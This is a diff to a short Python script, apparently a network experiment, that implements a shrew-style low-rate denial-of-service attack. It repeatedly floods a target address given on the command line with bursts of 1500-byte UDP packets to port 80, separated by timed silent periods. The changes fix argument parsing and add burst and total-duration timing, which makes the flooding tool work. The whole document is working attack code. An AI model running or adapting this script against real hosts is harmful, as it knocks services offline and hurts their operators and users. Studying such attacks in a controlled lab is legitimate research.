@@ -7,6 +7,8 @@ from time import time, sleep
 """ Used http://www.binarytides.com/programming-udp-sockets-in-python/ """
 
 def shrew():
+	#f= open("guru99.txt","w+")
+	#f.close()
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	except socket.error:
@@ -14,18 +16,23 @@ def shrew():
 		sys.exit()
 	start_time = time()
 	addr = sys.argv[1]
-	burst_period = sys.argv[2]
-	burst_duration = sys.argv[3]
+	burst_period = float(sys.argv[2])
+	burst_duration = float(sys.argv[3])
+	total_time = float(sys.argv[4])
 	msg = 'a' * 1500
 	while True:
 		# burst period
+		start_burst_time = time()
 		while True:
 			s.sendto(msg, (addr, 80))
-			now = time()
-			delta = now - start_time
-			if delta > burst_duration:
+			burst_now = time()
+			burst_delta = burst_now - start_burst_time
+			if burst_delta > burst_duration:
 				break
-
+		now = time()
+		total_delta = now - start_time
+		if total_delta > total_time:
+			break
 		#TODO sleep might not be precise enough
 		# silent period
 		sleep(burst_period)
